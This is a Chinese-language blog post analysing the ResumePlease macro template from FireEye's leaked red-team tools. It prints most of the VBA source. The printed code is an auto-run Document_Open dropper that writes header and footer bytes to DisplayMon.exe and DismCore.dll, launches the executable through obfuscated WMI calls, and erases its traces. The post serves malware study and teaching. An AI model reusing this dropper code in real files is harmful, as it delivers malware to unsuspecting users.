---
title: ResumePlease宏恶意模板分析
date: 2021-05-15 10:32:58
tags: 恶意代码
---

简单的分析一下Fireeye之前泄漏的红队工具里面的ResumePlease。

注意，我说的简单分析真的是简单分析，并没有谦虚的意思。

<!--more-->

感觉好久没更博客了，都快不知道怎么新建文章了，五一放完假之后都在忙课堂展示，过程真的略操蛋，因为找到的一些样本都好难分析，换了好几个样本。

### 样本信息

样本基本信息：

> **MD5**            5e8343ce6c6e2894f46648c532b241e3
>
> **SHA1**           6339a5d6543343c868499acb6dd42e2d56e51391
>
> **SHA256**       1866449e8ad2c55240eafdf14fc835138ca3e99a7b180c2150cef047868f56cc
>
> **文件类型**       Visual Basic Script File
>
> **文件大小**        4449字节

这个文件我是从[MalShare](https://malshare.com)下载的。

这里推荐一下[奇安信威胁情报中心](https://ti.qianxin.com)是一个在线沙箱检测的网站，还挺好用的。



### 前置知识

[Tactics, Techniques and Procedures (TTPs) Utilized by FireEye’s Red Team Tools](https://www.picussecurity.com/resource/blog/techniques-tactics-procedures-utilized-by-fireeye-red-team-tools)

[FireEye红队工具失窃事件跟进分析](https://www.antiy.cn/research/notice&report/research_report/20201214.html)

上面这两篇文章里面都提到ResumePlease这个样本，根据这两篇文章里面的描述，ResumePlease是一个Microsoft Office宏恶意软件模板，它并不能单独执行，需要绑定有恶意载荷的文件，才能生成恶意文件。

VBA（Visual Basic for Applications）是Visual Basic的一种宏语言。主要能用来扩展Windows的应用程序功能，特别是Microsoft Office软件。

### 样本分析

#### Document_Open()

首先是`Document_Open()`函数，定义文档打开后的一些操作。

```
Sub Document_Open()
 
'#
    writeOutHeader
    writeOutFooter
    DoStuff
    Cleanup
```

#### writeOutHeader()

（1）开始是一系列变量声明，Dim是VB中声明变量并分配存储空间的语句；

（2）之后就是构造文件路径dropPath，这里相当于创建了一个DisplayMon.exe文件，后续会对该文件进行写入操作；

（3）Office VBA官方文档中提到wdHeaderFooterPrimary的一些信息和使用方法，strIn这里获取的是第一节的页眉，strln就是恶意payload；

（4）InStr函数将也页眉中获取的strIn通过';'进行分割，然后写入DisplayMon.exe文件中。

> 使用**标头**（索引）或**页脚**（索引），其中索引是**WdHeaderFooterIndex**常量之一（**wdHeaderFooterEvenPages**、 **wdHeaderFooterFirstPage**或**wdHeaderFooterPrimary**），返回一个**HeaderFooter**对象。

```
Sub writeOutHeader()
    On Error Resume Next
    Dim intFileNum As Integer
    Dim byteTemp As Byte
    Dim strByte1 As String
    Dim i, j, k As Double
    Dim strIn As String
    Dim blnDone As Boolean
    intFileNum = FreeFile
    Dim dropPath As String
    
    dropPath = Environ("LOCALAPPDATA") & "\DisplayMon.exe"
    ` Environ获取环境变量，这里是生成DisplayMon.exe程序

    Open dropPath For Binary As intFileNum
    ` 打开文件

    strIn = ActiveDocument.Sections(1).Headers(wdHeaderFooterPrimary).Range.Text
    ` ActiveDocument为office VBA编程接口 获取活动文档第一节的页眉
    blnDone = False
    i = 1
    j = 1

    Do While Not blnDone
        k = InStr(i + 1, strIn, ";")
        ` InStr函数：返回一个 **Variant **(Long) 值，指定一个字符串在另一个字符串中首次出现的位置。
        If k = 0 Then
            blnDone = True
        Else
            blnDone = False
            strByte1 = Mid(strIn, i + 1, k - i - 1)
            ' a = CLng(strByte1)
            Put intFileNum, , CByte(strByte1)
            ` put语法  Put [#]filenumber, [recnumber], varname  这里是将strIn中内容，循环写入DisplayMon.exe文件
            i = k
            strByte1 = ""
            j = j + 1
            End If
    Loop
    Close intFileNum
End Sub
```

writeOutFooter与writeOutHeader基本上一样的，只不过将文档第一节的页脚内容写入DismCore.dll文件中。

#### DoStuff()

Dostuff()函数就是用来调用Windows内置函数来允许之前生成的恶意文件DisplayMon.exe

```
Sub DoStuff()

    Const WHAT = 12
    blah = Environ("LOCALAPPDATA") & "\DisplayMon.exe"
    Set serveYa = GetObject("wi" & "nmg" & "mts:\\.\r" & "oot\ci" & "mv2")
    ` winmgmts:\\.\root\cimv2   遍历进程列表
    Set startYa = serveYa.Get("Wi" & "n32_Pr" & "ocessS" & "tartup")
    ` Win32_ProcessStartup  基于Windows的进程的启动配置
    Set whatYa = startYa.SpawnInstance_
    whatYa.ShowWindow = WHAT
    Set procYa = GetObject("wi" & "nmgmt" & "s:r" & "oot\ci" & "mv2:W" & "in32_P" & "rocess")
    res = procYa.Create(blah, Null, whatYa, processid)
    ` 运行DisplayMon.exe

End Sub
```

#### Cleanup()

Cleanup()函数就是将office文件里面的恶意载荷清空，这样有一定隐蔽性，用户再打开恶意office文件的时候也无法发现什么。

```
Sub Cleanup()

    ActiveDocument.Sections(1).Headers(wdHeaderFooterPrimary).Range.Text = ""
    ActiveDocument.Sections(1).Footers(wdHeaderFooterPrimary).Range.Text = ""
    ActiveDocument.Save

End Sub
```



这个文件只是一个模板，没有办法运行，本来想找一个相关的payload，但是搞完这个展示就懒了，不知道啥时候还会想起来弄。

还有就是不知道为什么安天分析报告里面强调是excel文件，感觉代码里面并没有体现这一点。

月底估计还有一个样本分析相关的博客。

---

5.18补充

看了中国大学mooc里面的《软件安全之恶意代码机理与防护》，C7脚本病毒及宏病毒里面就讲了相关内容。

（1）一个是宏病毒感染机理：存在于数据文件或模板中，利用宏语言的功能将自己寄生到其他数据文档。

（2）其次是一些会自动执行的宏，Document_Open()就是一个自动执行的宏，有机会执行恶意行为，

![](1.png)

（3）拆分一次字符串，简单的混淆方法

`GetObject("wi" & "nmgmt" & "s:r" & "oot\ci" & "mv2:W" & "in32_P" & "rocess")` 